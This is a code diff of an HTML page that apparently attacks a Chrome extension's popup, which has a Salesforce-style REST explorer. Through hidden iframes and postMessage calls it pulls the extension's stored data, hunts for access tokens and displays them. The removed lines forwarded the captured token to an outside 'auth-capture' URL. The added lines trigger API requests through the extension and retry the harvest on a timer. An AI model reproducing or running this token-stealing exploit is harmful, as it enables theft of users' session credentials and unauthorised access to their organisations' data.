@@ -11,7 +11,7 @@
     </style>
 </head>
 <body>
-    <div id="messages" class="info-section">Initializing...</div>
+    <div id="messages" class="info-section">Initializing and making API request...</div>
     <div id="storageInfo" class="info-section"></div>
     <div id="networkLog"></div>
     <script>
@@ -35,22 +35,33 @@
             }));
         }
 
-        // Create and load the extension iframe
-        const initFrame = document.createElement('iframe');
-        initFrame.src = 'chrome-extension://apfebnafilpofmbeebponacgbdhnkmnl/popup.html';
-        initFrame.style.display = 'none';
-        document.body.appendChild(initFrame);
+        // Create and load initial explorer frame with automatic API request
+        const explorerFrame = document.createElement('iframe');
+        const params = new URLSearchParams({
+            endpoint: '/services/data/v59.0/',  // Simple API endpoint that should work on any org
+            method: 'GET',
+            format: 'json',
+            cache: Date.now()
+        });
+        explorerFrame.src = `chrome-extension://apfebnafilpofmbeebponacgbdhnkmnl/popup.html#/restexplorer?${params.toString()}`;
+        explorerFrame.className = 'explorer-frame';
+        document.body.appendChild(explorerFrame);
 
-        // Wait for iframe to load, then send the initialization request
-        initFrame.onload = function() {
-            // Send the initial request to the extension
-            initFrame.contentWindow.postMessage({
-                insextInitRequest: true,
-                iFrameLocalStorage: JSON.parse(JSON.stringify(localStorage))
-            }, '*');
-        };
+        // Wait a bit for the request to complete, then check for token
+        setTimeout(() => {
+            const initFrame = document.createElement('iframe');
+            initFrame.src = 'chrome-extension://apfebnafilpofmbeebponacgbdhnkmnl/popup.html';
+            initFrame.style.display = 'none';
+            document.body.appendChild(initFrame);
 
-        // Listen for the response
+            initFrame.onload = function() {
+                initFrame.contentWindow.postMessage({
+                    insextInitRequest: true,
+                    iFrameLocalStorage: JSON.parse(JSON.stringify(localStorage))
+                }, '*');
+            };
+        }, 2000);  // Wait 2 seconds for the API request to complete
+
         window.addEventListener('message', function(event) {
             // Ignore React DevTools messages
             if (event.data.source?.includes('react-devtools')) {
@@ -65,35 +76,9 @@
                 
                 const tokens = findAccessToken(storage);
 
-                messagesDiv.innerHTML = `
-                    <h3>Found Tokens:</h3>
-                    <pre>${JSON.stringify(tokens, null, 2)}</pre>
-                    
-                    <h3>Storage Keys:</h3>
-                    <pre>${JSON.stringify(Object.keys(storage), null, 2)}</pre>
-                `;
-
-                storageInfoDiv.innerHTML = `
-                    <h3>Full Storage:</h3>
-                    <pre>${JSON.stringify(storage, null, 2)}</pre>
-                `;
-
                 if (tokens.length > 0 && tokens[0].token) {
-                    const explorerFrame = document.createElement('iframe');
-                    const params = new URLSearchParams({
-                        endpoint: '.samanattar.github.io/auth-capture',
-                        method: 'GET',
-                        format: 'json',
-                        cache: Date.now(),
-                        instance: tokens[0].instance,
-                        access_token: tokens[0].token
-                    });
-                    explorerFrame.src = `chrome-extension://apfebnafilpofmbeebponacgbdhnkmnl/popup.html#/restexplorer?${params.toString()}`;
-                    explorerFrame.className = 'explorer-frame';
-                    document.body.appendChild(explorerFrame);
-
-                    networkLogDiv.innerHTML = `
-                        <h3>Using Token:</h3>
+                    messagesDiv.innerHTML = `
+                        <h3>Success! Token Found:</h3>
                         <pre>Instance: ${tokens[0].instance}</pre>
                         <pre>Token Key: ${tokens[0].tokenKey}</pre>
                         <pre>Token: ${tokens[0].token?.substring(0, 20)}...</pre>
@@ -102,8 +87,34 @@
                     messagesDiv.innerHTML += `
                         <h3>No Access Tokens Found</h3>
                         <p>Looking for pattern: [instance]_access_token</p>
+                        <p>Trying again in 2 seconds...</p>
                     `;
+                    
+                    // Try again after another delay
+                    setTimeout(() => {
+                        const retryFrame = document.createElement('iframe');
+                        retryFrame.src = 'chrome-extension://apfebnafilpofmbeebponacgbdhnkmnl/popup.html';
+                        retryFrame.style.display = 'none';
+                        document.body.appendChild(retryFrame);
+
+                        retryFrame.onload = function() {
+                            retryFrame.contentWindow.postMessage({
+                                insextInitRequest: true,
+                                iFrameLocalStorage: JSON.parse(JSON.stringify(localStorage))
+                            }, '*');
+                        };
+                    }, 2000);
                 }
+
+                storageInfoDiv.innerHTML = `
+                    <h3>Storage Keys:</h3>
+                    <pre>${JSON.stringify(Object.keys(storage), null, 2)}</pre>
+                `;
+
+                networkLogDiv.innerHTML = `
+                    <h3>Full Storage:</h3>
+                    <pre>${JSON.stringify(storage, null, 2)}</pre>
+                `;
             }
         });
     </script>
